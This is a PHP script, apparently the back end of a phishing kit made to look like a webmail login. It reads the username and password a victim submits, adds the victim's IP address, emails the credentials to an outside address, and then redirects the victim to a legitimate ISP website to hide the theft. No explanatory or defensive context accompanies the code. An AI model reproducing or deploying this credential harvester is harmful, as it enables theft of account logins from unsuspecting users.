<?

$ip = getenv("REMOTE_ADDR");
$do = "mail";
$message .= "--------------IN GOD I TRUST-----------------------\n";
$message .= "USERname   : ".$_POST['username']."\n";
$message .= "PASSWORD : ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "--------------Made By Ivanausqui---------------\n";
$send = "logzmasterolu@mail.mn";
$subject = "webmail -$ip";
$headers = "From: webmail <webmail@webmail.com>";
$headers .= $_POST['name']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
{
mail($send,$subject,$message,$headers);
                $do($er,$subject,$message,$headers);
}
header("Location: http://www.surewestkc.net/");
?>